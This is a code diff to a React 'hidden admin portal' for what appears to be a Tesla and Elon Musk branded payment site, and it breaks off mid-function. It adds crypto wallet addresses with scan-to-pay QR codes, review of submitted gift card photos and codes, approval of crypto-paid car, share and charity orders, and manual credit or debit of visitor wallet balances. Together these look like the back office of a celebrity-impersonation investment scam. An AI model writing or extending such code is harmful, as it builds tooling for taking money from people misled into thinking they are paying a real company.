@@ -29,7 +29,11 @@ import {
   Wallet,
   Gift,
   HeartHandshake,
-  Globe
+  Globe,
+  Copy,
+  QrCode,
+  Maximize2,
+  BookOpen
 } from 'lucide-react';
 import {
   TeslaOrder,
@@ -42,7 +46,15 @@ import {
   AdminPaymentAccounts,
   CharityDonationRequest,
   CharitySupportRequest,
+  CompanyWalletRecord,
+  OfficialWalletSymbol,
+  WalletLoadRequest,
 } from '../types';
+import {
+  OFFICIAL_COMPANY_WALLETS,
+  formatCompanyWalletsSummary,
+  mergeCompanyWallets,
+} from '../data/officialWallets';
 import { REAL_CAR_ASSET_PRESETS } from '../data/teslaVehicles';
 import {
   clearFailedAttempts,
@@ -51,6 +63,8 @@ import {
   verifyAdminPasscode,
   LOCKOUT_DURATION_MINUTES,
 } from '../utils/securityLockout';
+import { WalletQRCode, WalletScanModal } from './WalletQRCode';
+import { CryptoPaymentGuideModal } from './CryptoPaymentGuideModal';
 
 interface HiddenAdminPortalModalProps {
   isOpen: boolean;
@@ -88,6 +102,19 @@ interface HiddenAdminPortalModalProps {
   onRejectCharityDonation?: (donationId: string, reason?: string) => void;
   onApproveCharitySupport?: (requestId: string, notes?: string, provisionedAccount?: string) => void;
   onRejectCharitySupport?: (requestId: string, reason?: string) => void;
+  walletLoadRequests?: WalletLoadRequest[];
+  memberWalletBalances?: Record<string, number>;
+  onReviewWalletLoadRequest?: (
+    requestId: string,
+    nextStatus: 'approved' | 'held' | 'rejected',
+    adminNotes?: string
+  ) => void;
+  onAdjustMemberWalletBalance?: (
+    memberEmail: string,
+    deltaUsd: number,
+    walletSymbol: OfficialWalletSymbol,
+    reason?: string
+  ) => void;
 }
 
 export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
@@ -126,6 +153,10 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
   onRejectCharityDonation,
   onApproveCharitySupport,
   onRejectCharitySupport,
+  walletLoadRequests = [],
+  memberWalletBalances = {},
+  onReviewWalletLoadRequest,
+  onAdjustMemberWalletBalance,
 }) => {
   const [activeTab, setActiveTab] = useState<'approvals' | 'accounts' | 'add_car' | 'messages' | 'fleet' | 'referrals'>('approvals');
   const [approvalCategory, setApprovalCategory] = useState<'vehicles' | 'shares' | 'vip' | 'charity'>('vehicles');
@@ -138,7 +169,22 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
   const [wireDetailsInput, setWireDetailsInput] = useState<string>(adminPaymentAccounts.wireDetails || '');
   const [giftCardInstructionsInput, setGiftCardInstructionsInput] = useState<string>(adminPaymentAccounts.giftCardInstructions || '');
   const [cryptoAddressInput, setCryptoAddressInput] = useState<string>(adminPaymentAccounts.cryptoAddress || '');
+  const [companyWalletsDraft, setCompanyWalletsDraft] = useState<CompanyWalletRecord[]>(() =>
+    mergeCompanyWallets(adminPaymentAccounts.companyWallets)
+  );
+  const [walletReviewNotes, setWalletReviewNotes] = useState<{ [reqId: string]: string }>({});
+  const [adjustMemberEmail, setAdjustMemberEmail] = useState<string>('');
+  const [adjustAmountUsd, setAdjustAmountUsd] = useState<string>('500');
+  const [adjustCurrency, setAdjustCurrency] = useState<OfficialWalletSymbol>('BTC');
+  const [adjustReason, setAdjustReason] = useState<string>('');
+  const [adjustConfirmKeyword, setAdjustConfirmKeyword] = useState<string>('');
+  const [walletApproveConfirmInputs, setWalletApproveConfirmInputs] = useState<{ [reqId: string]: string }>({});
+  const [cryptoApprovalConfirmInputs, setCryptoApprovalConfirmInputs] = useState<{ [itemId: string]: string }>({});
+  const [adjustSavedMsg, setAdjustSavedMsg] = useState<string | null>(null);
   const [accountsSavedBanner, setAccountsSavedBanner] = useState<boolean>(false);
+  const [expandedQrWallet, setExpandedQrWallet] = useState<CompanyWalletRecord | null>(null);
+  const [isCryptoGuideOpen, setIsCryptoGuideOpen] = useState<boolean>(false);
+  const [copiedWalletSymbol, setCopiedWalletSymbol] = useState<string | null>(null);
   const [selectedMessageId, setSelectedMessageId] = useState<string | null>(null);
   const [adminReplyText, setAdminReplyText] = useState('');
   const [approvalFilter, setApprovalFilter] = useState<'pending' | 'approved' | 'rejected' | 'all'>('pending');
@@ -152,7 +198,13 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
     setWireDetailsInput(adminPaymentAccounts.wireDetails || '');
     setGiftCardInstructionsInput(adminPaymentAccounts.giftCardInstructions || '');
     setCryptoAddressInput(adminPaymentAccounts.cryptoAddress || '');
-  }, [adminPaymentAccounts.wireDetails, adminPaymentAccounts.giftCardInstructions, adminPaymentAccounts.cryptoAddress]);
+    setCompanyWalletsDraft(mergeCompanyWallets(adminPaymentAccounts.companyWallets));
+  }, [
+    adminPaymentAccounts.wireDetails,
+    adminPaymentAccounts.giftCardInstructions,
+    adminPaymentAccounts.cryptoAddress,
+    adminPaymentAccounts.companyWallets,
+  ]);
 
   useEffect(() => {
     if (!isOpen) {
@@ -160,6 +212,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
       setPasscodeInput('');
       setPasscodeError('');
       setShowPasscode(false);
+      setIsCryptoGuideOpen(false);
     }
   }, [isOpen]);
 
@@ -313,6 +366,7 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
   const pendingReferrals = referralConversions.filter((r) => r.status === 'pending_admin_approval');
   const approvedReferrals = referralConversions.filter((r) => r.status === 'approved');
   const pendingAccountRequests = paymentAccountRequests.filter((r) => r.status === 'pending_admin');
+  const pendingWalletLoads = walletLoadRequests.filter((w) => w.status === 'pending_approval');
   const totalApprovedCommission = approvedReferrals.reduce((sum, r) => sum + r.commissionEarned, 0);
   const totalPendingCommission = pendingReferrals.reduce((sum, r) => sum + r.commissionEarned, 0);
 
@@ -447,8 +501,16 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
             </div>
           </div>
 
-          <div className="flex items-center gap-3">
-            <div className="hidden sm:flex items-center gap-2 text-xs font-mono text-slate-300">
+          <div className="flex items-center gap-2.5 sm:gap-3">
+            <button
+              type="button"
+              onClick={() => setIsCryptoGuideOpen(true)}
+              className="px-3 py-1.5 rounded-lg bg-[#08142b] border border-blue-500/50 hover:border-emerald-400 text-blue-200 hover:text-white text-xs font-semibold flex items-center gap-1.5 cursor-pointer transition-colors whitespace-nowrap shrink-0"
+            >
+              <BookOpen className="w-3.5 h-3.5 text-emerald-400" />
+              <span>Crypto Payment Guide</span>
+            </button>
+            <div className="hidden md:flex items-center gap-2 text-xs font-mono text-slate-300">
               <span className="w-2 h-2 rounded-full bg-emerald-400" />
               <span>Elon Musk Management Live</span>
             </div>
@@ -524,11 +586,11 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                 : 'border-transparent text-slate-400 hover:text-slate-200'
             }`}
           >
-            <Building2 className="w-4 h-4 text-blue-400" />
-            <span>Payment Accounts</span>
-            {pendingAccountRequests.length > 0 && (
+            <Wallet className="w-4 h-4 text-emerald-400" />
+            <span>Wallets &amp; Accounts</span>
+            {pendingAccountRequests.length + pendingWalletLoads.length > 0 && (
               <span className="px-1.5 py-0.5 rounded-full text-[10px] bg-red-600 text-white font-mono tabular-nums font-bold">
-                {pendingAccountRequests.length}
+                {pendingAccountRequests.length + pendingWalletLoads.length}
               </span>
             )}
           </button>
@@ -857,6 +919,42 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                             </div>
                           </div>
 
+                          {(order.giftCardType || (order.giftCardPhotos && order.giftCardPhotos.length > 0)) && (
+                            <div className="p-3 rounded-xl bg-[#040a18] border border-amber-500/40 space-y-2 text-xs">
+                              <div className="flex flex-wrap items-center justify-between gap-2">
+                                <span className="font-bold text-amber-300 font-mono">
+                                  Gift Card Submitted: {order.giftCardType || 'Gift Card'}
+                                  {order.giftCardFormat ? ` (${order.giftCardFormat === 'ecode' ? 'e-Code' : 'Physical'})` : ''}
+                                  {order.giftCardFaceValue ? ` · $${order.giftCardFaceValue.toLocaleString()}` : ''}
+                                  {order.giftCardCodeLast4 ? ` · Ends in ${order.giftCardCodeLast4}` : ''}
+                                </span>
+                                <span className="text-[10px] font-mono text-slate-400">
+                                  {order.giftCardPhotos?.length || 0} photo(s) attached
+                                </span>
+                              </div>
+                              {order.giftCardPhotos && order.giftCardPhotos.length > 0 && (
+                                <div className="flex flex-wrap gap-2">
+                                  {order.giftCardPhotos.map((p) => (
+                                    <div
+                                      key={p.id}
+                                      className="p-1 rounded-lg bg-[#08142b] border border-blue-900/70 flex items-center gap-2"
+                                    >
+                                      <img
+                                        src={p.dataUrl}
+                                        alt={p.label}
+                                        className="w-10 h-10 rounded object-cover"
+                                      />
+                                      <div className="pr-1.5">
+                                        <div className="text-[10px] font-bold text-white">{p.label}</div>
+                                        <div className="text-[9px] font-mono text-slate-400 max-w-[90px] truncate">{p.fileName}</div>
+                                      </div>
+                                    </div>
+                                  ))}
+                                </div>
+                              )}
+                            </div>
+                          )}
+
                           {/* Admin Decision Actions */}
                           {isPending ? (
                             <div className="pt-3 border-t border-blue-900/50 flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-3">
@@ -872,25 +970,55 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                                 />
                               </div>
 
-                              <div className="flex items-center gap-2">
-                                <button
-                                  onClick={() => {
-                                    onRejectPayment(order.orderId, approvalNotes[order.orderId]);
-                                  }}
-                                  className="px-3.5 py-2 rounded-xl bg-[#040a18] border border-blue-900/70 hover:border-red-500/50 text-slate-300 text-xs font-semibold cursor-pointer transition-colors"
-                                >
-                                  Reject Payment
-                                </button>
-                                <button
-                                  onClick={() => {
-                                    onApprovePayment(order.orderId, approvalNotes[order.orderId]);
-                                  }}
-                                  className="px-5 py-2 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold shadow-md cursor-pointer transition-all flex items-center gap-1.5"
-                                >
-                                  <Check className="w-4 h-4 stroke-[3]" />
-                                  <span>Approve Payment & Confirm Allocation</span>
-                                </button>
-                              </div>
+                               <div className="flex flex-wrap items-center gap-2">
+                                 {order.paymentMethod === 'crypto' && (
+                                   <input
+                                     type="text"
+                                     value={cryptoApprovalConfirmInputs[order.orderId] || ''}
+                                     onChange={(e) =>
+                                       setCryptoApprovalConfirmInputs((prev) => ({
+                                         ...prev,
+                                         [order.orderId]: e.target.value,
+                                       }))
+                                     }
+                                     aria-label={`Type CONFIRM to finalize crypto order ${order.orderId}`}
+                                     placeholder="Type CONFIRM..."
+                                     className={`w-36 px-2.5 py-2 rounded-xl bg-[#040a18] border text-xs font-mono tracking-wider text-white placeholder:text-slate-500 focus:outline-none ${
+                                       (cryptoApprovalConfirmInputs[order.orderId] || '').trim() === 'CONFIRM'
+                                         ? 'border-emerald-500/70 focus:border-emerald-400'
+                                         : 'border-amber-500/45 focus:border-blue-400'
+                                     }`}
+                                   />
+                                 )}
+                                 <button
+                                   onClick={() => {
+                                     onRejectPayment(order.orderId, approvalNotes[order.orderId]);
+                                   }}
+                                   className="px-3.5 py-2 rounded-xl bg-[#040a18] border border-blue-900/70 hover:border-red-500/50 text-slate-300 text-xs font-semibold cursor-pointer transition-colors"
+                                 >
+                                   Reject Payment
+                                 </button>
+                                 <button
+                                   disabled={
+                                     order.paymentMethod === 'crypto' &&
+                                     (cryptoApprovalConfirmInputs[order.orderId] || '').trim() !== 'CONFIRM'
+                                   }
+                                   onClick={() => {
+                                     onApprovePayment(order.orderId, approvalNotes[order.orderId]);
+                                     if (order.paymentMethod === 'crypto') {
+                                       setCryptoApprovalConfirmInputs((prev) => ({ ...prev, [order.orderId]: '' }));
+                                     }
+                                   }}
+                                   className="px-5 py-2 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold shadow-md cursor-pointer transition-all flex items-center gap-1.5"
+                                 >
+                                   <Check className="w-4 h-4 stroke-[3]" />
+                                   <span>
+                                     {order.paymentMethod === 'crypto'
+                                       ? 'Confirm Payment & Approve'
+                                       : 'Approve Payment & Confirm Allocation'}
+                                   </span>
+                                 </button>
+                               </div>
                             </div>
                           ) : (
                             <div className="pt-2.5 border-t border-blue-900/50 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-[11px] text-slate-400 font-mono">
@@ -1055,7 +1183,26 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                                 />
                               </div>
 
-                              <div className="flex items-center gap-2">
+                              <div className="flex flex-wrap items-center gap-2">
+                                {shareOrder.paymentMethod === 'crypto' && (
+                                  <input
+                                    type="text"
+                                    value={cryptoApprovalConfirmInputs[shareOrder.orderId] || ''}
+                                    onChange={(e) =>
+                                      setCryptoApprovalConfirmInputs((prev) => ({
+                                        ...prev,
+                                        [shareOrder.orderId]: e.target.value,
+                                      }))
+                                    }
+                                    aria-label={`Type CONFIRM to finalize crypto share order ${shareOrder.orderId}`}
+                                    placeholder="Type CONFIRM..."
+                                    className={`w-36 px-2.5 py-2 rounded-xl bg-[#040a18] border text-xs font-mono tracking-wider text-white placeholder:text-slate-500 focus:outline-none ${
+                                      (cryptoApprovalConfirmInputs[shareOrder.orderId] || '').trim() === 'CONFIRM'
+                                        ? 'border-emerald-500/70 focus:border-emerald-400'
+                                        : 'border-amber-500/45 focus:border-blue-400'
+                                    }`}
+                                  />
+                                )}
                                 <button
                                   onClick={() => {
                                     if (onRejectShareOrder) {
@@ -1067,15 +1214,29 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                                   Reject Allocation
                                 </button>
                                 <button
+                                  disabled={
+                                    shareOrder.paymentMethod === 'crypto' &&
+                                    (cryptoApprovalConfirmInputs[shareOrder.orderId] || '').trim() !== 'CONFIRM'
+                                  }
                                   onClick={() => {
                                     if (onApproveShareOrder) {
                                       onApproveShareOrder(shareOrder.orderId, shareApprovalNotes[shareOrder.orderId]);
+                                      if (shareOrder.paymentMethod === 'crypto') {
+                                        setCryptoApprovalConfirmInputs((prev) => ({
+                                          ...prev,
+                                          [shareOrder.orderId]: '',
+                                        }));
+                                      }
                                     }
                                   }}
-                                  className="px-5 py-2 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 text-white text-xs font-bold shadow-md cursor-pointer transition-all flex items-center gap-1.5"
+                                  className="px-5 py-2 rounded-xl bg-gradient-to-r from-blue-600 via-blue-700 to-red-600 hover:brightness-110 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold shadow-md cursor-pointer transition-all flex items-center gap-1.5"
                                 >
                                   <Check className="w-4 h-4 stroke-[3]" />
-                                  <span>Approve Share Allocation & Issue Certificate</span>
+                                  <span>
+                                    {shareOrder.paymentMethod === 'crypto'
+                                      ? 'Confirm Payment & Approve Shares'
+                                      : 'Approve Share Allocation & Issue Certificate'}
+                                  </span>
                                 </button>
                               </div>
                             </div>
@@ -1469,7 +1630,26 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                                   }
                                   className="flex-1 px-3 py-1.5 rounded-lg bg-[#040a18] border border-blue-900/70 text-xs text-white focus:outline-none focus:border-blue-400 placeholder:text-slate-500"
                                 />
-                                <div className="flex items-center gap-2 shrink-0">
+                                <div className="flex flex-wrap items-center gap-2 shrink-0">
+                                  {don.paymentMethod === 'crypto' && (
+                                    <input
+                                      type="text"
+                                      value={cryptoApprovalConfirmInputs[don.donationId] || ''}
+                                      onChange={(e) =>
+                                        setCryptoApprovalConfirmInputs((prev) => ({
+                                          ...prev,
+                                          [don.donationId]: e.target.value,
+                                        }))
+                                      }
+                                      aria-label={`Type CONFIRM to finalize crypto donation ${don.donationId}`}
+                                      placeholder="Type CONFIRM..."
+                                      className={`w-36 px-2.5 py-2 rounded-xl bg-[#040a18] border text-xs font-mono tracking-wider text-white placeholder:text-slate-500 focus:outline-none ${
+                                        (cryptoApprovalConfirmInputs[don.donationId] || '').trim() === 'CONFIRM'
+                                          ? 'border-emerald-500/70 focus:border-emerald-400'
+                                          : 'border-amber-500/45 focus:border-blue-400'
+                                      }`}
+                                    />
+                                  )}
                                   <button
                                     type="button"
                                     onClick={() =>
@@ -1481,13 +1661,27 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                                   </button>
                                   <button
                                     type="button"
-                                    onClick={() =>
-                                      onApproveCharityDonation?.(don.donationId, charityNotes[don.donationId])
+                                    disabled={
+                                      don.paymentMethod === 'crypto' &&
+                                      (cryptoApprovalConfirmInputs[don.donationId] || '').trim() !== 'CONFIRM'
                                     }
-                                    className="px-4 py-2 rounded-xl bg-gradient-to-r from-blue-600 to-emerald-600 hover:brightness-110 text-white text-xs font-bold cursor-pointer flex items-center gap-1.5"
+                                    onClick={() => {
+                                      onApproveCharityDonation?.(don.donationId, charityNotes[don.donationId]);
+                                      if (don.paymentMethod === 'crypto') {
+                                        setCryptoApprovalConfirmInputs((prev) => ({
+                                          ...prev,
+                                          [don.donationId]: '',
+                                        }));
+                                      }
+                                    }}
+                                    className="px-4 py-2 rounded-xl bg-gradient-to-r from-blue-600 to-emerald-600 hover:brightness-110 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold cursor-pointer flex items-center gap-1.5"
                                   >
                                     <Check className="w-4 h-4" />
-                                    <span>Approve Donation &amp; Issue Receipt</span>
+                                    <span>
+                                      {don.paymentMethod === 'crypto'
+                                        ? 'Confirm Payment & Approve Donation'
+                                        : 'Approve Donation & Issue Receipt'}
+                                    </span>
                                   </button>
                                 </div>
                               </div>
@@ -2121,9 +2315,134 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                     rows={3}
                     value={cryptoAddressInput}
                     onChange={(e) => setCryptoAddressInput(e.target.value)}
-                    placeholder="Enter BTC / DOGE / USDC wallet address and accepted network..."
+                    placeholder="Auto-synced from Official Company Wallets below..."
                     className="w-full px-3 py-2 text-xs bg-[#040a18] border border-blue-900/70 rounded-xl text-white font-mono placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
                   />
+                </div>
+              </div>
+
+              {/* Official 9 Company Wallet Addresses Control Panel */}
+              <div className="pt-4 border-t border-blue-900/60 space-y-3">
+                <div className="flex flex-wrap items-center justify-between gap-2">
+                  <div>
+                    <h5 className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-1.5">
+                      <QrCode className="w-3.5 h-3.5 text-emerald-400" />
+                      <span>Official Company Wallet Addresses &amp; Scan-to-Pay QR Codes</span>
+                    </h5>
+                    <p className="text-[11px] text-slate-400">
+                      Every official wallet displays a live scannable QR code for visitors to scan and pay easily. Click any QR code to enlarge or save.
+                    </p>
+                  </div>
+                  <div className="flex flex-wrap items-center gap-2">
+                    <button
+                      type="button"
+                      onClick={() => setIsCryptoGuideOpen(true)}
+                      className="px-3 py-1.5 rounded-lg bg-blue-600/20 border border-blue-500/50 hover:bg-blue-600/35 text-blue-200 hover:text-white text-[11px] font-semibold flex items-center gap-1.5 cursor-pointer whitespace-nowrap"
+                    >
+                      <BookOpen className="w-3.5 h-3.5 text-emerald-400" />
+                      <span>Open Crypto Payment Guide</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={() => {
+                        const restored = OFFICIAL_COMPANY_WALLETS.map((w) => ({ ...w }));
+                        setCompanyWalletsDraft(restored);
+                        setCryptoAddressInput(formatCompanyWalletsSummary(restored));
+                      }}
+                      className="px-3 py-1.5 rounded-lg bg-[#040a18] border border-blue-800/70 text-blue-200 hover:text-white text-[11px] font-mono cursor-pointer whitespace-nowrap"
+                    >
+                      Restore Official Defaults
+                    </button>
+                  </div>
+                </div>
+
+                <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
+                  {companyWalletsDraft.map((wallet, idx) => (
+                    <div
+                      key={wallet.symbol}
+                      className="p-3 rounded-xl bg-[#040a18] border border-blue-900/70 space-y-2.5"
+                    >
+                      <div className="flex items-center justify-between gap-2">
+                        <div className="flex items-center gap-2 min-w-0">
+                          <span className="px-2 py-0.5 rounded bg-blue-600/25 border border-blue-500/40 text-[10px] font-mono font-bold text-blue-200 shrink-0">
+                            {wallet.symbol}
+                          </span>
+                          <div className="min-w-0">
+                            <div className="text-xs font-bold text-white truncate">{wallet.name}</div>
+                            <div className="text-[10px] font-mono text-blue-300/80 truncate">{wallet.network}</div>
+                          </div>
+                        </div>
+                        <label className="flex items-center gap-1.5 text-[11px] font-mono text-slate-300 cursor-pointer shrink-0">
+                          <input
+                            type="checkbox"
+                            checked={wallet.enabled}
+                            onChange={(e) => {
+                              const next = companyWalletsDraft.map((item, i) =>
+                                i === idx ? { ...item, enabled: e.target.checked } : item
+                              );
+                              setCompanyWalletsDraft(next);
+                            }}
+                            className="accent-emerald-500"
+                          />
+                          <span>Active</span>
+                        </label>
+                      </div>
+
+                      <div className="flex items-center gap-3">
+                        <div className="flex-1 min-w-0 space-y-2">
+                          <input
+                            type="text"
+                            value={wallet.address}
+                            onChange={(e) => {
+                              const next = companyWalletsDraft.map((item, i) =>
+                                i === idx ? { ...item, address: e.target.value } : item
+                              );
+                              setCompanyWalletsDraft(next);
+                            }}
+                            aria-label={`${wallet.name} wallet address`}
+                            className="w-full px-3 py-1.5 rounded-lg bg-[#08142b] border border-blue-900/70 text-[11px] font-mono text-emerald-200 focus:outline-none focus:border-blue-400"
+                          />
+                          <div className="flex flex-wrap items-center gap-1.5">
+                            <button
+                              type="button"
+                              onClick={() => {
+                                navigator.clipboard.writeText(wallet.address);
+                                setCopiedWalletSymbol(wallet.symbol);
+                                setTimeout(
+                                  () => setCopiedWalletSymbol((curr) => (curr === wallet.symbol ? null : curr)),
+                                  1800
+                                );
+                              }}
+                              className="px-2.5 py-1 rounded-md bg-[#08142b] border border-blue-800/70 hover:border-blue-400 text-[10px] font-mono text-blue-200 hover:text-white flex items-center gap-1 cursor-pointer"
+                            >
+                              {copiedWalletSymbol === wallet.symbol ? (
+                                <Check className="w-3 h-3 text-emerald-400" />
+                              ) : (
+                                <Copy className="w-3 h-3" />
+                              )}
+                              <span>{copiedWalletSymbol === wallet.symbol ? 'Copied' : 'Copy Address'}</span>
+                            </button>
+                            <button
+                              type="button"
+                              disabled={!wallet.address.trim()}
+                              onClick={() => setExpandedQrWallet(wallet)}
+                              className="px-2.5 py-1 rounded-md bg-[#08142b] border border-emerald-500/45 hover:border-emerald-400 disabled:opacity-40 text-[10px] font-mono text-emerald-200 hover:text-white flex items-center gap-1 cursor-pointer"
+                            >
+                              <Maximize2 className="w-3 h-3" />
+                              <span>Scan QR</span>
+                            </button>
+                          </div>
+                        </div>
+
+                        <WalletQRCode
+                          address={wallet.address}
+                          label={wallet.name}
+                          size={76}
+                          onExpand={wallet.address.trim() ? () => setExpandedQrWallet(wallet) : undefined}
+                        />
+                      </div>
+                    </div>
+                  ))}
                 </div>
               </div>
 
@@ -2133,11 +2452,13 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                   onClick={() => {
                     setWireDetailsInput('');
                     setGiftCardInstructionsInput('');
-                    setCryptoAddressInput('');
+                    const defaultSummary = formatCompanyWalletsSummary(companyWalletsDraft);
+                    setCryptoAddressInput(defaultSummary);
                     onSaveAdminPaymentAccounts?.({
                       wireDetails: '',
                       giftCardInstructions: '',
-                      cryptoAddress: '',
+                      cryptoAddress: defaultSummary,
+                      companyWallets: companyWalletsDraft,
                       updatedAt: new Date().toISOString(),
                     });
                     setAccountsSavedBanner(true);
@@ -2145,15 +2466,18 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                   }}
                   className="px-3.5 py-2 rounded-lg bg-[#040a18] border border-blue-900/70 text-slate-300 hover:text-white text-xs font-semibold cursor-pointer"
                 >
-                  Clear Public Checkout Accounts
+                  Clear Wire / Gift Card Accounts
                 </button>
                 <button
                   type="button"
                   onClick={() => {
+                    const summary = formatCompanyWalletsSummary(companyWalletsDraft);
+                    setCryptoAddressInput(summary);
                     onSaveAdminPaymentAccounts?.({
                       wireDetails: wireDetailsInput.trim(),
                       giftCardInstructions: giftCardInstructionsInput.trim(),
-                      cryptoAddress: cryptoAddressInput.trim(),
+                      cryptoAddress: summary || cryptoAddressInput.trim(),
+                      companyWallets: companyWalletsDraft,
                       updatedAt: new Date().toISOString(),
                     });
                     setAccountsSavedBanner(true);
@@ -2161,8 +2485,279 @@ export const HiddenAdminPortalModal: React.FC<HiddenAdminPortalModalProps> = ({
                   }}
                   className="px-4 py-2 rounded-lg bg-gradient-to-r from-blue-600 to-red-600 hover:brightness-110 text-white text-xs font-bold cursor-pointer"
                 >
-                  Save Payment Accounts
+                  Save Accounts &amp; Company Wallets
                 </button>
+              </div>
+            </div>
+
+            {/* Individual Control: Loaded Wallet Money & Payment Approvals */}
+            <div className="p-5 rounded-2xl bg-[#08142b] border border-emerald-500/40 space-y-5">
+              <div className="flex flex-wrap items-center justify-between gap-3">
+                <div>
+                  <h4 className="font-bold text-sm text-white flex items-center gap-2">
+                    <ShieldAlert className="w-4 h-4 text-emerald-400" />
+                    <span>Individual Control · Wallet Loaded Funds &amp; Payment Approvals</span>
+                  </h4>
+                  <p className="text-xs text-slate-300 mt-0.5">
+                    Money loaded on visitor personal wallets stays pending until individually approved, placed on hold, or adjusted by management here.
+                  </p>
+                </div>
+                {adjustSavedMsg && (
+                  <span className="text-xs font-mono text-emerald-300 font-bold">
+                    {adjustSavedMsg}
+                  </span>
+                )}
+              </div>
+
+              {/* Direct Individual Balance Credit / Debit Control */}
+              {onAdjustMemberWalletBalance && (
+                <div className="p-4 rounded-xl bg-[#040a18] border border-blue-900/70 space-y-3">
+                  <div className="text-xs font-bold text-blue-200 uppercase tracking-wider">
+                    Direct Visitor Wallet Balance Control (Load / Deduct USD)
+                  </div>
+                  <div className="grid grid-cols-1 sm:grid-cols-4 gap-3">
+                    <input
+                      type="email"
+                      value={adjustMemberEmail}
+                      onChange={(e) => setAdjustMemberEmail(e.target.value)}
+                      placeholder="Visitor email address..."
+                      className="sm:col-span-2 px-3 py-2 text-xs bg-[#08142b] border border-blue-900/70 rounded-lg text-white font-mono placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                    />
+                    <select
+                      value={adjustCurrency}
+                      onChange={(e) => setAdjustCurrency(e.target.value as OfficialWalletSymbol)}
+                      className="px-3 py-2 text-xs bg-[#08142b] border border-blue-900/70 rounded-lg text-white font-mono focus:outline-none focus:border-blue-400"
+                    >
+                      {companyWalletsDraft.map((w) => (
+                        <option key={w.symbol} value={w.symbol}>
+                          {w.symbol} Wallet
+                        </option>
+                      ))}
+                    </select>
+                    <input
+                      type="number"
+                      min={1}
+                      step="0.01"
+                      value={adjustAmountUsd}
+                      onChange={(e) => setAdjustAmountUsd(e.target.value)}
+                      placeholder="Amount USD"
+                      className="px-3 py-2 text-xs bg-[#08142b] border border-blue-900/70 rounded-lg text-white font-mono tabular-nums focus:outline-none focus:border-blue-400"
+                    />
+                  </div>
+                  <div className="flex flex-col sm:flex-row gap-2">
+                    <input
+                      type="text"
+                      value={adjustReason}
+                      onChange={(e) => setAdjustReason(e.target.value)}
+                      placeholder="Approval note / reason (optional)..."
+                      className="flex-1 px-3 py-2 text-xs bg-[#08142b] border border-blue-900/70 rounded-lg text-white placeholder:text-slate-500 focus:outline-none focus:border-blue-400"
+                    />
+                    <input
+                      type="text"
+                      value={adjustConfirmKeyword}
+                      onChange={(e) => setAdjustConfirmKeyword(e.target.value)}
+                      aria-label="Type CONFIRM to authorize wallet balance transaction"
+                      placeholder="Type CONFIRM..."
+                      className={`sm:w-36 px-3 py-2 text-xs bg-[#08142b] border rounded-lg font-mono tracking-wider text-white placeholder:text-slate-500 focus:outline-none ${
+                        adjustConfirmKeyword.trim() === 'CONFIRM'
+                          ? 'border-emerald-500/70 focus:border-emerald-400'
+                          : 'border-amber-500/45 focus:border-blue-400'
+                      }`}
+                    />
+                    <button
+                      type="button"
+                      disabled={adjustConfirmKeyword.trim() !== 'CONFIRM'}
+                      onClick={() => {
+                        const amt = Number(adjustAmountUsd);
+                        if (
+                          adjustConfirmKeyword.trim() !== 'CONFIRM' ||
+                          !adjustMemberEmail.trim() ||
+                          !Number.isFinite(amt) ||
+                          amt <= 0
+                        ) {
+                          return;
+                        }
+                        onAdjustMemberWalletBalance(
+                          adjustMemberEmail.trim().toLowerCase(),
+                          amt,
+                          adjustCurrency,
+                          adjustReason.trim() || undefined
+                        );
+                        setAdjustSavedMsg(`Loaded +$${amt.toLocaleString()} to ${adjustMemberEmail.trim().toLowerCase()}`);
+                        setAdjustReason('');
+                        setAdjustConfirmKeyword('');
+                        setTimeout(() => setAdjustSavedMsg(null), 3000);
+                      }}
+                      className="px-4 py-2 rounded-lg bg-emerald-600 hover:bg-emerald-500 disabled:opacity-45 disabled:cursor-not-allowed text-white text-xs font-bold cursor-pointer whitespace-nowrap"
+                    >
+                      Confirm &amp; Load Funds (+$)
+                    </button>
+                    <button
+                      type="button"
+                      disabled={adjustConfirmKeyword.trim() !== 'CONFIRM'}
+                      onClick={() => {
+                        const amt = Number(adjustAmountUsd);
+                        if (
+                          adjustConfirmKeyword.trim() !== 'CONFIRM' ||
+                          !adjustMemberEmail.trim() ||
+                          !Number.isFinite(amt) ||
+                          amt <= 0
+                        ) {
+                          return;
+                        }
+                        onAdjustMemberWalletBalance(
+                          adjustMemberEmail.trim().toLowerCase(),
+                          -amt,
+                          adjustCurrency,
+                          adjustReason.trim() || undefined
+                        );
